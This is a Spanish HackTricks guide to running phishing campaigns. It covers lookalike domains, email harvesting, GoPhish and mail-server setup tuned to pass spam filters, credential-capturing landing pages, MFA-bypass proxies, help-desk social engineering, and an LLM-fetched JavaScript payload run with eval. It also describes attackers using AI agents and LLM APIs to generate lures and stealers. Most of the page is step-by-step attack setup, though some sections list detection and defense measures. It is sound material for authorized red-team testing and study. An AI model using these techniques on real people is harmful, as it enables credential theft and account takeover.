# Metodología de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodología

1. Recon la víctima
1. Selecciona el **dominio de la víctima**.
2. Realiza una enumeración web básica **buscando portales de login** utilizados por la víctima y **decide** cuál vas a **suplantar**.
3. Usa **OSINT** para **encontrar correos electrónicos**.
2. Preparar el entorno
1. **Compra el dominio** que vas a usar para la evaluación de phishing
2. **Configura los registros** relacionados con el servicio de email (SPF, DMARC, DKIM, rDNS)
3. Configura el VPS con **gophish**
3. Preparar la campaña
1. Prepara la **plantilla de email**
2. Prepara la **página web** para robar las credenciales
4. ¡Lanza la campaña!

## Generar nombres de dominio similares o comprar un dominio confiable

### Técnicas de variación de nombres de dominio

- **Keyword**: El nombre de dominio **contiene** una **palabra clave** importante del dominio original (ej., zelster.com-management.com).
- **hypened subdomain**: Cambia el **punto por un guión** de un subdominio (ej., www-zelster.com).
- **New TLD**: Mismo dominio usando un **nuevo TLD** (ej., zelster.org)
- **Homoglyph**: **Reemplaza** una letra en el nombre de dominio con **letras que se parecen** (ej., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Intercambia dos letras** dentro del nombre de dominio (ej., zelsetr.com).
- **Singularization/Pluralization**: Añade o quita una “s” al final del nombre de dominio (ej., zeltsers.com).
- **Omission**: **Elimina una** de las letras del nombre de dominio (ej., zelser.com).
- **Repetition:** **Repite una** de las letras del nombre de dominio (ej., zeltsser.com).
- **Replacement**: Similar a homoglyph pero menos sigiloso. Reemplaza una de las letras en el nombre de dominio, quizás por una letra en proximidad de la original en el teclado (ej., zektser.com).
- **Subdomained**: Introduce un **punto** dentro del nombre de dominio (ej., ze.lster.com).
- **Insertion**: **Inserta una letra** en el nombre de dominio (ej., zerltser.com).
- **Missing dot**: Añade la TLD al nombre de dominio. (ej., zelstercom.com)

**Herramientas automáticas**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sitios web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe la **posibilidad de que uno o varios bits almacenados o en comunicación se inviertan automáticamente** debido a varios factores como erupciones solares, rayos cósmicos o errores de hardware.

Cuando este concepto se **aplica a las consultas DNS**, es posible que el **dominio recibido por el servidor DNS** no sea el mismo que el dominio solicitado inicialmente.

Por ejemplo, una modificación de un solo bit en el dominio "windows.com" puede cambiarlo a "windnws.com."

Los atacantes pueden **aprovechar esto registrando múltiples dominios bit-flipping** que sean similares al dominio de la víctima. Su intención es redirigir usuarios legítimos a su propia infraestructura.

Para más información lee [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Comprar un dominio confiable

Puedes buscar en [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio expirado que puedas usar.\
Para asegurarte de que el dominio expirado que vas a comprar **ya tiene buen SEO** puedes comprobar cómo está categorizado en:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descubrimiento de correos electrónicos

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descubrir más** direcciones de correo válidas o **verificar las** que ya has encontrado puedes comprobar si puedes brute-force los servidores SMTP de la víctima. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Además, no olvides que si los usuarios usan **algún portal web para acceder a sus mails**, puedes comprobar si es vulnerable a **username brute force**, y explotar la vulnerabilidad si es posible.

## Configurando GoPhish

### Instalación

Puedes descargarlo desde [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Descárgalo y descomprímelo dentro de `/opt/gophish` y ejecuta `/opt/gophish/gophish`\
Se te dará una contraseña para el usuario admin en el puerto 3333 en la salida. Por tanto, accede a ese puerto y usa esas credenciales para cambiar la contraseña de admin. Puede que necesites tunelizar ese puerto a local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuración

**Configuración del certificado TLS**

Antes de este paso deberías haber **comprado ya el dominio** que vas a usar y debe estar **apuntando** a la **IP del VPS** donde estás configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuración de correo**

Empieza instalando: `apt-get install postfix`

Luego añade el dominio a los siguientes archivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Cambia también los valores de las siguientes variables dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finalmente modifica los archivos **`/etc/hostname`** y **`/etc/mailname`** con tu nombre de dominio y **reinicia tu VPS.**

Ahora, crea un **registro DNS A** de `mail.<domain>` apuntando a la **dirección IP** del VPS y un **registro DNS MX** apuntando a `mail.<domain>`

Ahora probemos a enviar un correo:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuración de Gophish**

Detén la ejecución de gophish y configurémoslo.\
Modifica `/opt/gophish/config.json` de la siguiente manera (fíjate en el uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar el servicio gophish**

Para crear el servicio gophish de modo que pueda iniciarse automáticamente y gestionarse como un servicio, puede crear el archivo `/etc/init.d/gophish` con el siguiente contenido:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Termina de configurar el servicio y compruébalo haciendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurando servidor de correo y dominio

### Espera & sé legítimo

Cuanto más antiguo sea un dominio, menos probable será que se marque como spam. Por eso deberías esperar el mayor tiempo posible (al menos 1 semana) antes de la evaluación de phishing. Además, si publicas una página relacionada con un sector con reputación, la reputación obtenida será mejor.

Ten en cuenta que, aunque tengas que esperar una semana, puedes terminar de configurar todo ahora.

### Configurar registro Reverse DNS (rDNS)

Configura un registro rDNS (PTR) que resuelva la dirección IP del VPS al nombre de dominio.

### Sender Policy Framework (SPF) Record

Debes **configurar un registro SPF para el nuevo dominio**. Si no sabes qué es un registro SPF [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puedes usar [https://www.spfwizard.net/](https://www.spfwizard.net) para generar tu política SPF (usa la IP de la máquina VPS)

![](<../../images/image (1037).png>)

Este es el contenido que debe establecerse dentro de un registro TXT en el dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Registro DMARC (Domain-based Message Authentication, Reporting & Conformance)

Debes **configurar un registro DMARC para el nuevo dominio**. Si no sabes qué es un registro DMARC [**lee esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Tienes que crear un nuevo registro DNS TXT apuntando al nombre de host `_dmarc.<domain>` con el siguiente contenido:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Debes **configurar un DKIM para el nuevo dominio**. Si no sabes qué es un registro DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Necesitas concatenar ambos valores B64 que genera la clave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Puedes hacerlo usando [https://www.mail-tester.com/](https://www.mail-tester.com/)\ Just access the page and send an email to the address they give you:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
También puedes **comprobar la configuración de tu correo** enviando un correo a `check-auth@verifier.port25.com` y **leyendo la respuesta** (para esto necesitarás **abrir** port **25** y ver la respuesta en el archivo _/var/mail/root_ si envías el correo como root).\
Comprueba que pasas todas las pruebas:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
También podrías enviar **un mensaje a un Gmail bajo tu control**, y comprobar los **encabezados del correo** en tu bandeja de entrada de Gmail, `dkim=pass` debería estar presente en el campo de cabecera `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Eliminación de la lista negra de Spamhouse

La página [www.mail-tester.com](https://www.mail-tester.com) puede indicarte si tu dominio está siendo bloqueado por Spamhaus. Puedes solicitar que tu dominio/IP sea eliminado en: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Eliminación de la lista negra de Microsoft

​​Puedes solicitar que tu dominio/IP sea eliminado en [https://sender.office.com/](https://sender.office.com).

## Crear y lanzar campaña de GoPhish

### Sending Profile

- Pon algún **nombre para identificar** el perfil del remitente
- Decide desde qué cuenta vas a enviar los emails de phishing. Sugerencias: _noreply, support, servicedesk, salesforce..._
- Puedes dejar en blanco el username y password, pero asegúrate de marcar Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Se recomienda usar la funcionalidad "**Send Test Email**" para comprobar que todo funciona.\
> Recomiendo **enviar los correos de prueba a direcciones de 10min mail** para evitar ser incluido en listas negras al hacer pruebas.

### Email Template

- Pon algún **nombre para identificar** la plantilla
- Luego escribe un **asunto** (nada extraño, simplemente algo que esperarías leer en un correo normal)
- Asegúrate de haber marcado "**Add Tracking Image**"
- Escribe la **plantilla de email** (puedes usar variables como en el siguiente ejemplo):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota que **para aumentar la credibilidad del email**, se recomienda usar alguna firma tomada de un email del cliente. Sugerencias:

- Envía un email a una **dirección inexistente** y comprueba si la respuesta contiene alguna firma.
- Busca **emails públicos** como info@ex.com o press@ex.com o public@ex.com y envíales un email y espera la respuesta.
- Intenta contactar **algún email válido descubierto** y espera la respuesta

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Escribe un **nombre**
- **Escribe el código HTML** de la página web. Ten en cuenta que puedes **importar** páginas web.
- Marca **Capture Submitted Data** y **Capture Passwords**
- Establece una **redirección**

![](<../../images/image (826).png>)

> [!TIP]
> Normalmente tendrás que modificar el código HTML de la página y hacer pruebas en local (quizá usando algún servidor Apache) **hasta que te gusten los resultados.** Luego, escribe ese código HTML en el cuadro.\
> Ten en cuenta que si necesitas **usar recursos estáticos** para el HTML (quizá algunos archivos CSS y JS) puedes guardarlos en _**/opt/gophish/static/endpoint**_ y luego acceder a ellos desde _**/static/\<filename>**_

> [!TIP]
> Para la redirección podrías **redirigir a los usuarios a la página web legítima principal** de la víctima, o redirigirlos a _/static/migration.html_ por ejemplo, poner una **rueda de carga (**[**https://loading.io/**](https://loading.io)**) durante 5 segundos y luego indicar que el proceso fue exitoso**.

### Users & Groups

- Establece un nombre
- **Importa los datos** (ten en cuenta que para usar la plantilla de ejemplo necesitas firstname, last name y email address de cada usuario)

![](<../../images/image (163).png>)

### Campaign

Finalmente, crea una campaña seleccionando un nombre, la email template, la landing page, la URL, el sending profile y el grupo. Ten en cuenta que la URL será el enlace enviado a las víctimas.

Nota que el **Sending Profile permite enviar un test email para ver cómo quedará el email de phishing final**:

![](<../../images/image (192).png>)

> [!TIP]
> Recomendaría **enviar los test emails a direcciones 10min mails** para evitar ser incluido en blacklists al hacer pruebas.

Una vez que todo esté listo, ¡lanza la campaña!

## Website Cloning

Si por cualquier razón quieres clonar el sitio web revisa la siguiente página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

En algunas evaluaciones de phishing (principalmente para Red Teams) también querrás **enviar archivos que contengan algún tipo de backdoor** (quizá un C2 o quizá solo algo que dispare una autenticación).\
Consulta la siguiente página para algunos ejemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

El ataque anterior es bastante ingenioso ya que estás suplantando una web real y recopilando la información introducida por el usuario. Desafortunadamente, si el usuario no puso la contraseña correcta o si la aplicación que suplantaste está configurada con 2FA, **esa información no te permitirá suplantar al usuario engañado**.

Aquí es donde herramientas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) y [**muraena**](https://github.com/muraenateam/muraena) son útiles. Esta herramienta te permitirá generar un ataque MitM. Básicamente, el ataque funciona de la siguiente manera:

1. Tú **suplantas el formulario de login** de la página real.
2. El usuario **envía** sus **credenciales** a tu página falsa y la herramienta las reenvía a la página real, **comprobando si las credenciales funcionan**.
3. Si la cuenta está configurada con **2FA**, la página MitM pedirá el código y una vez el **usuario lo introduce** la herramienta lo enviará a la página real.
4. Una vez el usuario está autenticado tú (como atacante) habrás **capturado las credenciales, el 2FA, la cookie y cualquier información** de cada interacción mientras la herramienta realiza el MitM.

### Via VNC

¿Qué pasa si en lugar de **enviar a la víctima a una página maliciosa** con la misma apariencia que la original, la envías a una **sesión VNC con un navegador conectado a la página real**? Podrás ver lo que hace, robar la contraseña, el MFA utilizado, las cookies...\
Puedes hacer esto con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviamente una de las mejores formas de saber si te han descubierto es **buscar tu dominio dentro de blacklists**. Si aparece listado, de algún modo tu dominio fue detectado como sospechoso.\
Una forma fácil de comprobar si tu dominio aparece en alguna blacklist es usar [https://malwareworld.com/](https://malwareworld.com)

Sin embargo, hay otras formas de saber si la víctima está **buscando activamente actividad sospechosa de phishing en la red** como se explica en:


{{#ref}}
detecting-phising.md
{{#endref}}

Puedes **comprar un dominio con un nombre muy similar** al dominio de la víctima **y/o generar un certificado** para un **subdominio** de un dominio controlado por ti **que contenga** la **keyword** del dominio de la víctima. Si la **víctima** realiza cualquier tipo de interacción DNS o HTTP con ellos, sabrás que **está buscando activamente** dominios sospechosos y necesitarás ser muy sigiloso.

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious) para evaluar si tu email va a acabar en la carpeta de spam o si será bloqueado o tendrá éxito.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Conjuntos de intrusión modernos cada vez omiten los lures por email y **apuntan directamente al workflow de service-desk / identity-recovery** para derrotar el MFA. El ataque es totalmente "living-off-the-land": una vez el operador tiene credenciales válidas pivotan con herramientas administrativas integradas – no se requiere malware.

### Attack flow
1. Recon la víctima
* Recolecta detalles personales y corporativos de LinkedIn, data breaches, GitHub público, etc.
* Identifica identidades de alto valor (ejecutivos, IT, finanzas) y enumera el **exacto help-desk process** para reset de password / MFA.
2. Social engineering en tiempo real
* Llama por teléfono, Teams o chat al help-desk haciéndote pasar por la víctima (a menudo con **spoofed caller-ID** o **voz clonada**).
* Proporciona la PII recopilada previamente para pasar la verificación basada en conocimiento.
* Convence al agente para que **reseteé el MFA secret** o realice un **SIM-swap** en un número móvil registrado.
3. Acciones inmediatas post-acceso (≤60 min en casos reales)
* Establece un foothold a través de cualquier portal web SSO.
* Enumera AD / AzureAD con herramientas integradas (sin dejar binarios):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Movimiento lateral con **WMI**, **PsExec**, o agentes legítimos **RMM** ya autorizados en el entorno.

### Detection & Mitigation
* Trata la recuperación de identidad por help-desk como una **operación privilegiada** – requiere step-up auth y aprobación del manager.
* Despliega reglas **Identity Threat Detection & Response (ITDR)** / **UEBA** que alerten sobre:
* Método MFA cambiado + autenticación desde nuevo dispositivo / geo.
* Elevación inmediata del mismo principal (user-→-admin).
* Graba las llamadas al help-desk y exige un **call-back a un número ya registrado** antes de cualquier reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** para que las cuentas recién reseteadas **no** hereden automáticamente tokens de alto privilegio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Grupos commodity compensan el coste de operaciones high-touch con ataques masivos que convierten a **motores de búsqueda y redes publicitarias en el canal de entrega**.

1. **SEO poisoning / malvertising** impulsa un resultado falso como `chromium-update[.]site` a la cima de los anuncios de búsqueda.
2. La víctima descarga un pequeño **first-stage loader** (a menudo JS/HTA/ISO). Ejemplos observados por Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. El loader exfiltra cookies del navegador + credential DBs, luego descarga un **silent loader** que decide – *en tiempo real* – si desplegar:
* RAT (p.ej. AsyncRAT, RustDesk)
* ransomware / wiper
* componente de persistencia (registry Run key + scheduled task)

### Hardening tips
* Bloquea dominios recién registrados y aplica **Advanced DNS / URL Filtering** en anuncios de búsqueda así como en email.
* Restringe la instalación de software a paquetes MSI firmados / Store, deniega la ejecución de `HTA`, `ISO`, `VBS` por política.
* Monitoriza por procesos hijo de navegadores que abren instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Caza LOLBins frecuentemente abusados por first-stage loaders (p.ej. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Los atacantes ahora encadenan **LLM & voice-clone APIs** para lures totalmente personalizados e interacción en tiempo real.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Añade **banners dinámicos** que destaquen mensajes enviados por automatización no confiable (mediante anomalías ARC/DKIM).  
• Despliega **voice-biometric challenge phrases** para peticiones telefónicas de alto riesgo.  
• Simula continuamente lures generados por AI en programas de concienciación – las plantillas estáticas están obsoletas.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Los atacantes pueden servir HTML de apariencia benigna y **generar el stealer en tiempo de ejecución** pidiendo a una **trusted LLM API** JavaScript, y luego ejecutarlo en el navegador (p.ej., `eval` o `<script>` dinámico).

1. **Prompt-as-obfuscation:** codifica exfil URLs/Base64 strings en el prompt; itera la redacción para evadir filtros de seguridad y reducir hallucinations.
2. **Client-side API call:** al cargar, el JS llama a un LLM público (Gemini/DeepSeek/etc.) o a un proxy CDN; solo el prompt/la llamada API está presente en el HTML estático.
3. **Assemble & exec:** concatena la respuesta y ejecútala (polimórfico por visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** el código generado personaliza el cebo (e.g., LogoKit token parsing) y envía creds al endpoint oculto en el prompt.

**Evasion traits**
- El tráfico alcanza dominios bien conocidos de LLM o proxies CDN reputables; a veces vía WebSockets hacia un backend.
- No hay payload estático; el JS malicioso existe solo después del renderizado.
- Generaciones no determinísticas producen **stealers** únicos por sesión.

**Detection ideas**
- Ejecutar sandboxes con JS habilitado; marcar **runtime `eval`/creación dinámica de scripts originados en respuestas de LLM**.
- Buscar POSTs front-end a APIs de LLM inmediatamente seguidos por `eval`/`Function` sobre el texto retornado.
- Alertar sobre dominios de LLM no sancionados en el tráfico del cliente junto con POSTs de credenciales posteriores.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Además del clásico push-bombing, los operadores simplemente **forzan un nuevo registro de MFA** durante la llamada al servicio de soporte, anulando el token existente del usuario. Cualquier aviso de inicio de sesión posterior parecerá legítimo para la víctima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitorea eventos de AzureAD/AWS/Okta donde **`deleteMFA` + `addMFA`** ocurran **en un intervalo de minutos desde la misma IP**.



## Clipboard Hijacking / Pastejacking

Los atacantes pueden copiar silenciosamente comandos maliciosos en el portapapeles de la víctima desde una página web comprometida o typosquatted y luego engañar al usuario para que los pegue en **Win + R**, **Win + X** o en una ventana de terminal, ejecutando código arbitrario sin ninguna descarga ni adjunto.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Los operadores cada vez más colocan sus flujos de phishing detrás de una comprobación simple del dispositivo para que los crawlers de escritorio nunca lleguen a las páginas finales. Un patrón común es un pequeño script que prueba si el DOM es touch-capable y hace un POST del resultado a un server endpoint; los clientes no‑móviles reciben HTTP 500 (o una página en blanco), mientras que a los usuarios móviles se les sirve el flujo completo.

Fragmento mínimo del cliente (lógica típica):
```html
<script src="/static/detect_device.js"></script>
```
Lógica de `detect_device.js` (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamiento del servidor observado con frecuencia:
- Establece una cookie de sesión durante la primera carga.
- Acepta `POST /detect {"is_mobile":true|false}`.
- Devuelve 500 (o una página placeholder) a GETs posteriores cuando `is_mobile=false`; sirve phishing solo si `true`.

Heurísticas de hunting y detección:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Telemetría web: secuencia de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para no‑móvil; rutas legítimas de víctimas móviles devuelven 200 con HTML/JS subsecuente.
- Bloquee o examine detenidamente las páginas que condicionen el contenido exclusivamente en `ontouchstart` u otras comprobaciones de dispositivo similares.

Consejos de defensa:
- Ejecute crawlers con fingerprints tipo móvil y JS habilitado para revelar contenido restringido.
- Genere alertas por respuestas 500 sospechosas posteriores a `POST /detect` en dominios registrados recientemente.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
